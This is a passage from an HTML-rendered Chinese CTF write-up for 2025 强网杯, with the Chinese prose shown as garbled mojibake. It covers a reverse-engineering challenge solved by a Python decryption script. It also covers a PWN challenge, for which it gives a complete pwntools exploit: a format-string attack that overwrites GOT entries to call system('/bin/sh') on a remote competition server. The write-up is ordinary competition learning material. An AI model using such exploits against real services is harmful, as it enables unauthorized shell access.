<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://47.105.120.74:1001/user/TTXSMCC/edit
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="flag-8">flag
</h4><p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/20.png"
	width="690"
	height="540"
	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/20_hu_fb3fe51ab016b35d.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/20_hu_764495c5d30ea443.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="127"
		data-flex-basis="306px"
	
></p>
<h2 id="reverse">Reverse
</h2><h3 id="butterfly">butterfly
</h3><h4 id="è§£é¢˜æ€è·¯-8">è§£é¢˜æ€è·¯
</h4><p>éšæ„è¾“å…¥<code>flag{11111111111111111111111111111}\n</code>å¾—åˆ°ï¼š</p>
<p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/21.png"
	width="690"
	height="250"
	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/21_hu_491cf0bbd1659a24.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/21_hu_a67af51819ead78.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="276"
		data-flex-basis="662px"
	
></p>
<p>çŒœæµ‹æ˜¯ 8 å­—èŠ‚åŠ å¯†ï¼Œæ‰¾åˆ°å…³é”®é€»è¾‘ï¼š</p>
<p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/22.png"
	width="690"
	height="1042"
	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/22_hu_d607f7082ca08402.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/22_hu_17b96d1d67271510.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="66"
		data-flex-basis="158px"
	
></p>
<p>å†™åå‘ç®—æ³•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;encode.dat.key&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;encode.dat&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">encoded_data</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">solve</span><span class="p">(</span><span class="n">encoded_data</span><span class="p">:</span> <span class="nb">list</span><span class="p">,</span> <span class="n">key</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">encoded_data</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">x</span> <span class="o">-</span> <span class="n">y</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">bn</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">bn</span> <span class="o">=</span> <span class="p">((</span><span class="n">bn</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">bn</span> <span class="o">&lt;&lt;</span> <span class="mi">63</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">64</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">bt</span> <span class="o">=</span> <span class="n">bn</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;little&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">2</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">bt</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">],</span> <span class="n">bt</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">b</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">encoded_data</span><span class="p">)</span> <span class="o">//</span> <span class="mi">8</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">encoded_data</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span> <span class="o">+</span> <span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="n">solve</span><span class="p">(</span><span class="n">encoded_data</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span> <span class="o">+</span> <span class="mi">8</span><span class="p">],</span> <span class="n">key</span><span class="p">[:</span><span class="mi">8</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">encoded_data</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="flag-9">flag
</h4><p>flag{butter_fly_mmx_encode_7778167}</p>
<h2 id="pwn">PWN
</h2><h3 id="flag-market">flag-market
</h3><p>å¤šäº<code>pwn-s.</code>å¸ˆå‚…ï¼ŒæŠŠè¿™é¢˜è‚ä¸‹äº†ï¼Œåœ¨è¿™é‡Œè‡´è°¢ã€‚ <a class="link" href="flag-market" >flag-market</a></p>
<h4 id="è§£é¢˜æ€è·¯-9">è§£é¢˜æ€è·¯
</h4><p>scanf æº¢å‡ºï¼š</p>
<p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/23.png"
	width="690"
	height="778"
	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/23_hu_2629b1e75326aa85.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/23_hu_bd5795a007dc7ddc.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="88"
		data-flex-basis="212px"
	
></p>
<p>æº¢å‡ºå¯ä¿®æ”¹dataæ®µformatå­—ç¬¦ä¸²ï¼Œå¯¼è‡´æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œç¬¬ä¸€æ¬¡æ³„éœ²åœ°å€+ä¿®æ”¹exit gotè¡¨ä¸ºmainå‡½æ•°ï¼Œç¬¬äºŒæ¬¡ä¿®æ”¹atoi gotè¡¨ä¸ºsystem getshellã€‚</p>
<p><img src="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/24.png"
	width="690"
	height="354"
	srcset="/p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/24_hu_31762b04d7ddae6b.png 480w, /p/2025%E5%BC%BA%E7%BD%91%E6%9D%AF/24_hu_47c7615fa0b1f6af.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="194"
		data-flex-basis="467px"
	
></p>
<h4 id="expflag">expã€flag
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span><span class="lnt">92
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#coding=utf-8</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">binary</span> <span class="o">=</span> <span class="s2">&#34;./pwn&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
</span></span><span class="line"><span class="cl"><span class="n">ip</span> <span class="o">=</span> <span class="s1">&#39;47.93.216.175&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">20539</span>
</span></span><span class="line"><span class="cl"><span class="n">local</span> <span class="o">=</span>  <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">local</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">G</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">ret2libc</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;ret;&#34;</span><span class="p">),</span><span class="n">executable</span><span class="o">=</span><span class="kc">True</span><span class="p">)))</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;pop rdi; ret;&#39;</span><span class="p">))))</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">)))</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">ret2libc_</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">&#39;pop rdi; ret;&#39;</span><span class="p">))))</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">)))</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dbg</span><span class="p">(</span><span class="n">c</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">c</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">=</span><span class="k">lambda</span> <span class="n">data</span> <span class="p">:</span><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sa</span><span class="o">=</span><span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span> <span class="p">:</span><span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span><span class="o">=</span><span class="k">lambda</span> <span class="n">data</span> <span class="p">:</span><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span><span class="o">=</span><span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span> <span class="p">:</span><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">=</span><span class="k">lambda</span> <span class="n">numb</span><span class="o">=</span><span class="mi">4096</span> <span class="p">:</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">numb</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span><span class="o">=</span><span class="k">lambda</span> <span class="n">delims</span> <span class="p">:</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xf7</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">uheap</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">leak</span><span class="o">=</span><span class="k">lambda</span> <span class="n">name</span><span class="p">,</span><span class="n">addr</span> <span class="p">:</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;</span><span class="si">{}</span><span class="s1"> ===&gt; </span><span class="si">{:#x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">addr</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">ia</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">n32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="p">:</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x100000000</span><span class="o">+</span><span class="n">num</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">n64</span><span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="p">:</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x10000000000000000</span><span class="o">+</span><span class="n">num</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">##gdb.attach(io,&#39;dir ~/glibc/malloc/&#39;)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">main</span><span class="o">=</span><span class="mh">0x040139B</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#dbg(&#34;b *0x4014bc\nc&#34;)</span>
</span></span><span class="line"><span class="cl">    <span class="n">pl</span><span class="o">=</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x100</span>
</span></span><span class="line"><span class="cl">    <span class="n">pl</span><span class="o">+=</span><span class="s2">&#34;%&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x139b</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;c&#34;</span><span class="o">+</span><span class="s2">&#34;%12$hn&#34;</span><span class="o">+</span><span class="s2">&#34;%45$p&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">ru</span><span class="p">(</span><span class="s2">&#34;.exit&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sl</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ru</span><span class="p">(</span><span class="s2">&#34;o pay?&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sl</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;-1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ru</span><span class="p">(</span><span class="s2">&#34;e report&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sl</span><span class="p">(</span><span class="n">pl</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">ru</span><span class="p">(</span><span class="s2">&#34;2.exit&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sl</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ru</span><span class="p">(</span><span class="s2">&#34;o pay?&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sl</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x404090</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">ru</span><span class="p">(</span><span class="s2">&#34;0x&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">(</span><span class="mi">12</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mh">0x2a28b</span>
</span></span><span class="line"><span class="cl">    <span class="n">leak</span><span class="p">(</span><span class="s2">&#34;libc&#34;</span><span class="p">,</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">pl1</span><span class="o">=</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0x100</span>
</span></span><span class="line"><span class="cl">    <span class="n">pl1</span><span class="o">+=</span><span class="s2">&#34;%&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span><span class="o">&amp;</span><span class="mh">0xffff</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;c&#34;</span><span class="o">+</span><span class="s2">&#34;%12$hn&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">pl1</span><span class="o">+=</span><span class="s2">&#34;%&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="mh">0x10000</span><span class="o">-</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span><span class="o">&amp;</span><span class="mh">0xffff</span><span class="p">))</span><span class="o">+</span><span class="p">((</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span><span class="o">&gt;&gt;</span><span class="mi">16</span><span class="p">)</span><span class="o">&amp;</span><span class="mh">0xffff</span><span class="p">))</span><span class="o">+</span><span class="s2">&#34;c&#34;</span><span class="o">+</span><span class="s2">&#34;%13$hn&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">ru</span><span class="p">(</span><span class="s2">&#34;2.exit&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sl</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">ru</span><span class="p">(</span><span class="s2">&#34;.exit&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sl</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ru</span><span class="p">(</span><span class="s2">&#34;o pay?&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sl</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;-1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ru</span><span class="p">(</span><span class="s2">&#34;e report&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sl</span><span class="p">(</span><span class="n">pl1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">ru</span><span class="p">(</span><span class="s2">&#34;2.exit&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sl</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ru</span><span class="p">(</span><span class="s2">&#34;o pay?&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x404080</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x404082</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">ru</span><span class="p">(</span><span class="s2">&#34;exit&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sl</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pwn</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">ia</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>flag{9dda09d1-5b1a-4551-b293-feb59b0373f6}</p>
<h3 id="bph">bph
